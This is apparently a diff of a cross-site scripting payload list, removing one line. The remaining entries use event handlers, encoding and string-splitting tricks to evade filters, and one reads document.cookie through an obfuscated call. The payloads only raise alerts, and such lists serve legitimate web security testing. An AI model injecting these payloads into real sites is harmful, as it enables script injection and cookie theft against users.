@@ -40,7 +40,6 @@ KaOdcRYSw6jhu"><script>alert(document.domain)</script>vzsui
 %3Csvg%20onload=alert(%22MrHex88%22)%3E
 %3Cimg%20src=x%20onerror=alert(%22MrHex88%22)%3E
 "><svg onmouseover="confirm&#0000000040document.domain)
-<Img Src=OnXSS OnError=confirm(1337)>
 '%3e%3cscript%3ealert(5*5)%3c%2fscript%3eejj4sbx5w4o
 javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle="+a+b+c+" popover id=x>Hvita</hvita>")
 <a/href="javascript:Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">ClickMe
